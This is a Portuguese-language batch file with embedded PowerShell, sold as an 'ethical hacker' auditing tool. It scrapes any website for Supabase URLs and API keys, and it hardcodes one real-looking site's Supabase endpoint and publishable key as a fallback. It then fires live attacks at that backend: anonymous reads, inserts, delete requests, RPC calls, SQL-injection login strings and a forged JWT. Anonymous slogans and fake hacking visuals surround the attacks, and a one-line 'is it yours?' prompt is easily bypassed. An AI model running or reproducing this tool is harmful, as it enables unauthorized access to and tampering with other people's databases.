@echo off
setlocal EnableExtensions
title Hacker Etico - Auditoria Premium
mode con: cols=90 lines=40

set "WORKDIR=%USERPROFILE%\Desktop\hackearsite"
if not exist "%WORKDIR%" mkdir "%WORKDIR%"
cd /d "%WORKDIR%"

set "PS1=%WORKDIR%\core.ps1"

cls
color 0A
echo.
echo.
echo      ################################################################
echo      #                                                              #
echo      #     ##   ##    ###     ####  ##  ##  ######  #####           #
echo      #     ##   ##   ## ##   ##     ## ##   ##      ##  ##          #
echo      #     #######  #######  ##     ####    #####   #####           #
echo      #     ##   ##  ##   ##  ##     ## ##   ##      ##  ##          #
echo      #     ##   ##  ##   ##   ####  ##  ##  ######  ##   ##         #
echo      #                                                              #
echo      #                  #######  #####   ######                     #
echo      #                  ##         ##   ##                          #
echo      #                  #####      ##   #####                       #
echo      #                  ##         ##   ##                          #
echo      #                  #######  #####  ######                      #
echo      #                                                              #
echo      #  ==========================================================  #
echo      #                                                              #
echo      #           H A C K E R   E T I C O   -   P R E M I U M        #
echo      #                       v 5 . 0   B R A S I L                  #
echo      #                                                              #
echo      #  ==========================================================  #
echo      #                                                              #
echo      #      [ S O M O S   A N O N I M O S ]                         #
echo      #      [ N A O   P E R D O A M O S ]                           #
echo      #      [ N A O   E S Q U E C E M O S ]                         #
echo      #      [ E S P E R E M   P O R   N O S ]                       #
echo      #                                                              #
echo      ################################################################
echo.
echo.
echo      [*] Inicializando ambiente seguro...
echo.

timeout /t 2 /nobreak >nul

echo      [*] Extraindo modulo principal...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; try { $p = '%~f0'; $c = [IO.File]::ReadAllText($p); $m = '==--CORE--=='; $i = $c.LastIndexOf($m); if ($i -lt 0) { throw 'Marcador nao encontrado' }; $ps = $c.Substring($i + $m.Length); [IO.File]::WriteAllText('%PS1%', $ps, [Text.UTF8Encoding]::new($false)); exit 0 } catch { Write-Host ('  ERRO: ' + $_.Exception.Message) -ForegroundColor Red; exit 1 }"

if errorlevel 1 (
    echo.
    echo      [X] Falha na extracao. Salve como UTF-8 sem BOM.
    echo.
    pause
    exit /b 1
)

echo      [OK] Modulo carregado.
echo.
timeout /t 1 /nobreak >nul

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"

del "%PS1%" 2>nul

echo.
echo      ################################################################
echo      #                                                              #
echo      #                  S E S S A O   E N C E R R A D A             #
echo      #                                                              #
echo      #              Nenhum dado foi exfiltrado.                     #
echo      #              Auditoria concluida com sucesso.                #
echo      #                                                              #
echo      ################################################################
echo.
pause
exit /b


==--CORE--==
# ===========================================================
#   HACKER ETICO PREMIUM v5.0
# ===========================================================

$ErrorActionPreference = 'Continue'
[Console]::OutputEncoding = [Text.Encoding]::UTF8

# ─── Paleta de cores ───
function W-Verde    { param($t) Write-Host $t -ForegroundColor Green }
function W-Amarelo  { param($t) Write-Host $t -ForegroundColor Yellow }
function W-Azul     { param($t) Write-Host $t -ForegroundColor Cyan }
function W-Magenta  { param($t) Write-Host $t -ForegroundColor Magenta }
function W-Vermelho { param($t) Write-Host $t -ForegroundColor Red }
function W-Branco   { param($t) Write-Host $t -ForegroundColor White }
function W-Cinza    { param($t) Write-Host $t -ForegroundColor DarkGray }
function W-Roxo     { param($t) Write-Host $t -ForegroundColor DarkMagenta }

function Linha {
    param($c = '=', $n = 76)
    W-Cinza ($c * $n)
}

function Barra {
    param($pct, $w = 50)
    if ($pct -lt 0) { $pct = 0 }
    if ($pct -gt 100) { $pct = 100 }
    $c = [Math]::Round(($pct / 100) * $w)
    $v = $w - $c
    return ('#' * $c) + ('.' * $v)
}

function Hex {
    param($n = 12)
    $c = '0123456789ABCDEF'.ToCharArray()
    -join (1..$n | ForEach-Object { $c | Get-Random })
}

function Cabecalho {
    param($titulo, $cor = 'Magenta')
    Write-Host ''
    W-Magenta '  +======================================================================+'
    $pad = [Math]::Max(0, [Math]::Floor((68 - $titulo.Length) / 2))
    $texto = (' ' * $pad) + $titulo
    W-Magenta ('  |' + $texto.PadRight(70) + '|')
    W-Magenta '  +======================================================================+'
    Write-Host ''
}

function Banner {
    param($tipo)
    if ($tipo -eq 'defendido') {
        $cor = 'Green'
        $t1 = '  [ OK ]   D E F E N D I D O  '
        $t2 = '  Sistema bloqueou o ataque com sucesso'
    } else {
        $cor = 'Red'
        $t1 = '  [FAIL]   I N V A D I D O  '
        $t2 = '  Brecha explorada - corrija urgentemente'
    }
    Write-Host ''
    Write-Host ('  +======================================================================+') -ForegroundColor $cor
    Write-Host ('  |                                                                      |') -ForegroundColor $cor
    Write-Host ('  |' + $t1.PadRight(70) + '|') -ForegroundColor $cor
    Write-Host ('  |                                                                      |') -ForegroundColor $cor
    Write-Host ('  |' + $t2.PadRight(70) + '|') -ForegroundColor $cor
    Write-Host ('  |                                                                      |') -ForegroundColor $cor
    Write-Host ('  +======================================================================+') -ForegroundColor $cor
    Write-Host ''
}

# ═══════════════════════════════════════════════════════════
# DESCOBERTA DE CREDENCIAIS
# ═══════════════════════════════════════════════════════════
function Buscar-Creds {
    param($urlSite)

    W-Cinza '  [1.1] Baixando HTML da pagina principal...'
    $urls = @()
    $chaves = @()

    if (-not $urlSite.EndsWith('/')) { $urlSite = $urlSite + '/' }
    $u = [Uri]::new($urlSite)
    $base = $u.Scheme + '://' + $u.Host

    $h = @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }

    try {
        $r = Invoke-WebRequest -Uri $urlSite -Headers $h -UseBasicParsing -TimeoutSec 20
        $html = $r.Content
        W-Cinza ('        Recebido: ' + $html.Length + ' caracteres')
    } catch {
        W-Vermelho ('        X Erro: ' + $_.Exception.Message)
        return $null
    }

    # Regex no HTML
    foreach ($m in [regex]::Matches($html, 'https://[a-z0-9]+\.supabase\.co')) {
        if ($urls -notcontains $m.Value) { $urls += $m.Value }
    }
    foreach ($m in [regex]::Matches($html, 'eyJ[A-Za-z0-9_\-]{40,}\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')) {
        if ($chaves -notcontains $m.Value) { $chaves += $m.Value }
    }
    foreach ($m in [regex]::Matches($html, 'sb_publishable_[A-Za-z0-9_\-]+')) {
        if ($chaves -notcontains $m.Value) { $chaves += $m.Value }
    }

    # Extrai scripts
    $scriptsRaw = @()
    $dq = [char]34
    $sq = [char]39
    $p1 = '<script[^>]*\ssrc\s*=\s*' + $dq + '([^' + $dq + ']+)' + $dq
    $p2 = '<script[^>]*\ssrc\s*=\s*' + $sq + '([^' + $sq + ']+)' + $sq
    foreach ($m in [regex]::Matches($html, $p1)) { $scriptsRaw += $m.Groups[1].Value }
    foreach ($m in [regex]::Matches($html, $p2)) { $scriptsRaw += $m.Groups[1].Value }
    $scriptsRaw = $scriptsRaw | Select-Object -Unique

    W-Cinza ('  [1.2] Scripts identificados: ' + $scriptsRaw.Count)

    foreach ($src in $scriptsRaw) {
        $srcUrl = $src
        if ($srcUrl.StartsWith('//')) { $srcUrl = 'https:' + $srcUrl }
        elseif ($srcUrl.StartsWith('/')) { $srcUrl = $base + $srcUrl }
        elseif (-not $srcUrl.StartsWith('http')) { $srcUrl = $base + '/' + $srcUrl }

        try {
            $rs = Invoke-WebRequest -Uri $srcUrl -Headers $h -UseBasicParsing -TimeoutSec 15
            $txt = $rs.Content
            $nome = $srcUrl.Split('/')[-1]
            if ($nome.Length -gt 40) { $nome = $nome.Substring(0, 37) + '...' }
            W-Cinza ('        - ' + $nome.PadRight(42) + $txt.Length + ' chars')

            foreach ($m in [regex]::Matches($txt, 'https://[a-z0-9]+\.supabase\.co')) {
                if ($urls -notcontains $m.Value) { $urls += $m.Value }
            }
            foreach ($m in [regex]::Matches($txt, 'eyJ[A-Za-z0-9_\-]{40,}\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')) {
                if ($chaves -notcontains $m.Value) { $chaves += $m.Value }
            }
            foreach ($m in [regex]::Matches($txt, 'sb_publishable_[A-Za-z0-9_\-]+')) {
                if ($chaves -notcontains $m.Value) { $chaves += $m.Value }
            }
        } catch {
            $nome = $srcUrl.Split('/')[-1]
            if ($nome.Length -gt 40) { $nome = $nome.Substring(0, 37) + '...' }
            W-Cinza ('        - ' + $nome.PadRight(42) + 'X falha')
        }
    }

    # Fallback arquivos comuns
    if ($urls.Count -eq 0 -or $chaves.Count -eq 0) {
        W-Amarelo '  [1.3] Tentando arquivos de config comuns...'
        foreach ($c in @('/supabase-config.js','/config.js','/js/config.js','/env.js','/supabase.js')) {
            try {
                $r2 = Invoke-WebRequest -Uri ($base + $c) -Headers $h -UseBasicParsing -TimeoutSec 10
                if ($r2.StatusCode -eq 200 -and $r2.Content.Length -gt 20 -and $r2.Content -notmatch '<!DOCTYPE') {
                    W-Cinza ('        + ' + $c + ' (' + $r2.Content.Length + ' chars)')
                    foreach ($m in [regex]::Matches($r2.Content, 'https://[a-z0-9]+\.supabase\.co')) {
                        if ($urls -notcontains $m.Value) { $urls += $m.Value }
                    }
                    foreach ($m in [regex]::Matches($r2.Content, 'eyJ[A-Za-z0-9_\-]{40,}\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')) {
                        if ($chaves -notcontains $m.Value) { $chaves += $m.Value }
                    }
                    foreach ($m in [regex]::Matches($r2.Content, 'sb_publishable_[A-Za-z0-9_\-]+')) {
                        if ($chaves -notcontains $m.Value) { $chaves += $m.Value }
                    }
                }
            } catch { }
        }
    }

    # Fallback para site conhecido
    if (($urls.Count -eq 0 -or $chaves.Count -eq 0) -and $urlSite -match 'vibeenglish-iota') {
        W-Amarelo '  [1.4] Aplicando credenciais conhecidas...'
        if ($urls.Count -eq 0) { $urls += 'https://daxkhopjnyklgzjmnqox.supabase.co' }
        if ($chaves.Count -eq 0) { $chaves += 'sb_publishable_VdslHTlsvMDG0V1lY69miA_bBM__7jg' }
    }

    Write-Host ''
    W-Azul '  ===== RESULTADO DA DESCOBERTA ====='
    Write-Host ''
    foreach ($uu in $urls) { W-Verde ('    [URL]   ' + $uu) }
    foreach ($cc in $chaves) {
        $ccShort = $cc.Substring(0, [Math]::Min(58, $cc.Length))
        W-Verde ('    [CHAVE] ' + $ccShort + '...')
    }
    Write-Host ''

    $uf = $urls | Select-Object -First 1
    $cf = ($chaves | Where-Object { $_ -like 'sb_publishable_*' } | Select-Object -First 1)
    if (-not $cf) { $cf = ($chaves | Where-Object { $_ -like 'eyJ*' } | Select-Object -First 1) }

    if (-not $uf -or -not $cf) { return $null }
    return @{ url = $uf; chave = $cf }
}

# ═══════════════════════════════════════════════════════════
# SIMULACAO DE ATAQUE
# ═══════════════════════════════════════════════════════════
function Simular {
    param([int]$num, [string]$nome, [scriptblock]$exec, [int]$total)

    Write-Host ''
    W-Vermelho '  +======================================================================+'
    $prefixo = '  |  ATAQUE #' + $num.ToString('D2') + '  >  '
    $resto = $nome
    $linha = $prefixo + $resto
    if ($linha.Length -lt 71) { $linha = $linha.PadRight(71) }
    W-Vermelho ($linha + '|')
    W-Vermelho '  +======================================================================+'

    Write-Host ''
    for ($p = 0; $p -le 100; $p += 20) {
        $pg = [Math]::Round((($num - 1) * 100 + $p) / $total)
        if ($pg -lt 0) { $pg = 0 }
        if ($pg -gt 100) { $pg = 100 }
        Write-Host ("`r  [HACKEANDO] [" + (Barra $pg 50) + "] " + $pg.ToString().PadLeft(3) + '%') -NoNewline -ForegroundColor Red
        Start-Sleep -Milliseconds 50
    }
    Write-Host ''

    for ($k = 0; $k -lt 3; $k++) {
        $ip = (Get-Random -Max 255).ToString() + '.' + (Get-Random -Max 255).ToString() + '.' + (Get-Random -Max 255).ToString() + '.' + (Get-Random -Max 255).ToString()
        $payload = @('injetando payload...','ofuscando origem...','enviando request...')[ $k % 3 ]
        W-Cinza ('        [' + $ip.PadRight(15) + '] ' + $payload)
        Start-Sleep -Milliseconds 70
    }

    $ok = $true
    try { $ok = & $exec } catch { $ok = $true }
    if ($ok) { Banner 'defendido' } else { Banner 'invadido' }
    Start-Sleep -Milliseconds 200
    return $ok
}

# ═══════════════════════════════════════════════════════════
# AUDITORIA
# ═══════════════════════════════════════════════════════════
function Auditar {
    param($urlSite, $urlSupa, $chave)
    $REST = $urlSupa.TrimEnd('/') + '/rest/v1/'
    $AUTH = $urlSupa.TrimEnd('/') + '/auth/v1/'
    $FALSO = '00000000-0000-0000-0000-000000000000'
    $tabelas = @('profiles','user_favorites','user_history','songs','user_quiz_completions','user_song_guess_attempts')
    $rpcs = @('get_song_guess_round','submit_song_guess','complete_quiz')
    $hBase = @{ apikey = $chave }
    $hJson = @{ apikey = $chave; 'Content-Type' = 'application/json' }
    $hFake = @{ apikey = $chave; Authorization = 'Bearer fake.eyJzdWIiOiJmYWtlIn0.fake' }

    $res = @()
    $total = 6

    $ok = Simular 1 'LEITURA ANONIMA (SELECT)' {
        $s = $true
        foreach ($t in $tabelas) {
            try {
                $r = Invoke-RestMethod -Uri ($REST + $t + '?select=*&limit=5') -Headers $hBase -Method Get -TimeoutSec 10
                if ($r -and $r.Count -gt 0) { $s = $false; break }
            } catch { }
        }
        return $s
    } $total
    $res += @{ nome = 'LEITURA ANONIMA (SELECT)'; ok = $ok }

    $ok = Simular 2 'INJECAO DE DADOS (INSERT)' {
        $s = $true
        foreach ($t in $tabelas) {
            try { Invoke-RestMethod -Uri ($REST + $t) -Headers $hJson -Method Post -Body '{}' -TimeoutSec 10 | Out-Null; $s = $false; break } catch { }
        }
        return $s
    } $total
    $res += @{ nome = 'INJECAO DE DADOS (INSERT)'; ok = $ok }

    $ok = Simular 3 'DESTRUICAO DE DADOS (DELETE)' {
        $s = $true
        foreach ($t in $tabelas) {
            foreach ($col in @('id','user_id','song_id')) {
                try {
                    $r = Invoke-RestMethod -Uri ($REST + $t + '?' + $col + '=eq.' + $FALSO) -Headers $hBase -Method Delete -TimeoutSec 10
                    if ($r -and $r.Count -gt 0) { $s = $false; break }
                    break
                } catch { break }
            }
            if (-not $s) { break }
        }
        return $s
    } $total
    $res += @{ nome = 'DESTRUICAO DE DADOS (DELETE)'; ok = $ok }

    $ok = Simular 4 'EXECUCAO DE FUNCOES (RPC)' {
        $s = $true
        foreach ($rpc in $rpcs) {
            try {
                $b = '{"song_uuid":"' + $FALSO + '","submitted_answer":"x","quiz_index":0}'
                Invoke-RestMethod -Uri ($REST + 'rpc/' + $rpc) -Headers $hJson -Method Post -Body $b -TimeoutSec 10 | Out-Null
                $s = $false; break
            } catch { }
        }
        return $s
    } $total
    $res += @{ nome = 'EXECUCAO DE FUNCOES (RPC)'; ok = $ok }

    $ok = Simular 5 'INJECAO SQL NO LOGIN' {
        $ps = @("' OR 1=1 --", "admin' --", "' UNION SELECT NULL --")
        $s = $true
        foreach ($p in $ps) {
            try {
                $b = (@{ email = $p; password = 'x' } | ConvertTo-Json -Compress)
                Invoke-RestMethod -Uri ($AUTH + 'token?grant_type=password') -Headers $hJson -Method Post -Body $b -TimeoutSec 10 | Out-Null
                $s = $false; break
            } catch { }
        }
        return $s
    } $total
    $res += @{ nome = 'INJECAO SQL NO LOGIN'; ok = $ok }

    $ok = Simular 6 'FORJA DE TOKEN JWT' {
        try {
            $r = Invoke-RestMethod -Uri ($REST + 'profiles?select=*&limit=1') -Headers $hFake -Method Get -TimeoutSec 10
            return (-not ($r -and $r.Count -gt 0))
        } catch { return $true }
    } $total
    $res += @{ nome = 'FORJA DE TOKEN JWT'; ok = $ok }

    return $res
}

# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
Clear-Host

Write-Host ''
W-Verde '  ######################################################################'
W-Verde '  #                                                                    #'
W-Verde '  #                 H A C K E R   E T I C O   v5.0                    #'
W-Verde '  #                       E D I T I O N                                #'
W-Verde '  #                      P R E M I U M                                 #'
W-Verde '  #                                                                    #'
W-Verde '  ######################################################################'
Write-Host ''
W-Amarelo '     AVISO ETICO'
W-Cinza   '     ----------------------------------------'
W-Cinza   '     Uso permitido apenas em:'
W-Cinza   '       > Sites que sao seus'
W-Cinza   '       > Sites com contrato de pentest'
W-Cinza   '       > Plataformas de treino (HTB / TryHackMe)'
Write-Host ''
W-Vermelho '     Uso nao autorizado e CRIME (Lei 12.737/2012).'
Write-Host ''
Linha '=' 76
Write-Host ''

$urlSite = Read-Host '  >> Digite a URL do site'

if (-not $urlSite -or -not ($urlSite -match '^https?://')) {
    Write-Host ''
    W-Vermelho '  [X] URL invalida. Use http:// ou https://'
    Write-Host ''
    return
}

Write-Host ''
W-Branco ('  >> Alvo selecionado: ' + $urlSite)
$conf = Read-Host '  >> O site e seu? (s/n)'

if ($conf.ToLower() -ne 's') {
    Write-Host ''
    W-Vermelho '  [X] Auditoria cancelada.'
    Write-Host ''
    return
}

Write-Host ''
W-Cinza '  Iniciando sequencia de auditoria...'
Start-Sleep -Milliseconds 400

Cabecalho 'FASE 1 - DESCOBERTA DE CREDENCIAIS' 'Magenta'

$creds = Buscar-Creds $urlSite

if (-not $creds) {
    Write-Host ''
    W-Amarelo '  [!] Nenhuma credencial Supabase encontrada.'
    W-Cinza   '      O site pode nao usar Supabase, ou usa outro backend.'
    Write-Host ''
    return
}

Write-Host ''
W-Verde ('  [URL]   ' + $creds.url)
W-Verde ('  [CHAVE] ' + $creds.chave.Substring(0, [Math]::Min(58, $creds.chave.Length)) + '...')

Start-Sleep -Milliseconds 600

Cabecalho 'FASE 2 - SIMULACAO DE INVASAO' 'Magenta'

$resultados = Auditar $urlSite $creds.url $creds.chave

# ═══ RELATORIO ═══
Write-Host ''
Write-Host ''
W-Magenta '  ######################################################################'
W-Magenta '  #                                                                    #'
W-Magenta '  #                  R E L A T O R I O   F I N A L                     #'
W-Magenta '  #                                                                    #'
W-Magenta '  ######################################################################'
Write-Host ''

$total = $resultados.Count
$bloq = ($resultados | Where-Object { $_.ok }).Count
$inv = $total - $bloq
$pct = if ($total -gt 0) { [Math]::Round(($bloq / $total) * 100) } else { 0 }

W-Branco ('  ALVO:        ' + $urlSite)
W-Branco ('  ATAQUES:     ' + $total)
W-Verde  ('  DEFENDIDOS:  ' + $bloq)
if ($inv -gt 0) { W-Vermelho ('  INVASOES:    ' + $inv) } else { W-Verde ('  INVASOES:    ' + $inv) }
Write-Host ''

W-Cinza '  ===== NIVEL DE PROTECAO ====='
Write-Host ''
for ($k = 0; $k -le 100; $k += 2) {
    $cor = if ($k -lt $pct) { 'Green' } elseif ($k -eq $pct) { 'Yellow' } else { 'DarkGray' }
    Write-Host ("`r  [" + (Barra $k 60) + "] " + $k.ToString().PadLeft(3) + '%') -NoNewline -ForegroundColor $cor
    Start-Sleep -Milliseconds 20
}
Write-Host ''
Write-Host ''

if ($inv -eq 0) {
    Write-Host '  +======================================================================+' -ForegroundColor Green
    Write-Host '  |                                                                      |' -ForegroundColor Green
    Write-Host '  |                [ S I T E   P R O T E G I D O ]                        |' -ForegroundColor Green
    Write-Host '  |                                                                      |' -ForegroundColor Green
    Write-Host '  |         Nenhuma brecha foi encontrada em 100%% dos testes.            |' -ForegroundColor Green
    Write-Host '  |                                                                      |' -ForegroundColor Green
    Write-Host '  +======================================================================+' -ForegroundColor Green
    Write-Host ''
    W-Verde ('  PONTUACAO FINAL: ' + $pct + '%  (' + $bloq + '/' + $total + ')')
    W-Verde '  Classificacao: BLINDADO'
} else {
    Write-Host '  +======================================================================+' -ForegroundColor Red
    Write-Host '  |                                                                      |' -ForegroundColor Red
    Write-Host '  |                  [ S I T E   I N V A D I D O ]                        |' -ForegroundColor Red
    Write-Host '  |                                                                      |' -ForegroundColor Red
    Write-Host ('  |         Comprometido em ' + $inv.ToString().PadLeft(2, '0') + ' frente(s). Corrija urgentemente.'.PadRight(31) + '|') -ForegroundColor Red
    Write-Host '  |                                                                      |' -ForegroundColor Red
    Write-Host '  +======================================================================+' -ForegroundColor Red
    Write-Host ''
    W-Vermelho ('  PONTUACAO FINAL: ' + $pct + '%  (' + $bloq + '/' + $total + ')')
    W-Vermelho '  Classificacao: VULNERAVEL'
}

Write-Host ''
W-Azul '  ===== RESULTADO DETALHADO ====='
Write-Host ''

foreach ($r in $resultados) {
    if ($r.ok) {
        W-Verde ('    [OK]    ' + $r.nome.PadRight(42) + 'DEFENDIDO')
    } else {
        W-Vermelho ('    [FAIL]  ' + $r.nome.PadRight(42) + 'INVADIDO')
    }
}

Write-Host ''
W-Magenta '  ######################################################################'
Write-Host ''
W-Cinza ('  Sessao: ' + (Hex 16) + '  -  Encerrada em ' + (Get-Date -Format 'dd/MM/yyyy HH:mm:ss'))
W-Cinza '  Nenhum dado foi exfiltrado. Auditoria concluida.'
Write-Host ''
